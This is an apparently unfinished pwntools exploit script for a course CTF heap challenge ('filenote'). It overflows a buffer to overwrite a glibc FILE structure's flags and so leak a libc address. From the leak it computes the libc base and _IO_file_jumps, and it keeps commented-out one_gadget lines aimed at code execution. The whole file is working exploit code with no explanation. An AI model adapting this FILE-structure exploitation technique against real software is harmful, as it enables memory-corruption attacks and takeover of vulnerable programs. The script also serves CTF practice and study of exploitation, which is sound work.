from pwn import *

context.arch = 'amd64'
# context.binary = 'am64'
context.terminal = ['tmux', 'splitw', '-h']

if args['REMOTE']:
    p = remote('edu-ctf.zoolab.org', 30218 )
else:
    p = process('./filenote/chal')

l = ELF('./libc.so.6')


# p.recvuntil("0x")

# libc = int(p.recvline(), base = 16) - l.sym['stdout']
# 
# print(hex(libc))
# print(hex(_IO_file_jumps))

p.sendlineafter(">", "1")
p.sendlineafter(">", "2")

flags = 0xfbad1800

flags_addr = 0x7fa40ce9f600

payload = flat(
    flags, 0,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    1
)

leak_payload = flat(
    flags, 0,
    0, 0,
)

# p.sendlineafter("data>", b"A" * 0x210)
p.sendlineafter("data>", b"A" * 0x210 + payload)

# one_gadget = libc + 0xe6c81

p.sendlineafter(">" , "3")
p.sendlineafter(">" , "3")
p.sendlineafter(">" , "2")
p.sendlineafter("data>", b"b" * 0x10 + b"A" * 0x200 + leak_payload)
# p.sendline(p64(one_gadget))

p.sendlineafter(">" , "3")

leak = u64(p.recvuntil('A')[-17:-9])
libc = leak - 2019168
_IO_file_jumps = libc + l.sym['_IO_file_jumps']

print('leak: ' + hex(leak))
print('libc: ' + hex(libc))
print('_IO_file_jumps' + hex(_IO_file_jumps))

gdb.attach(p)


p.interactive()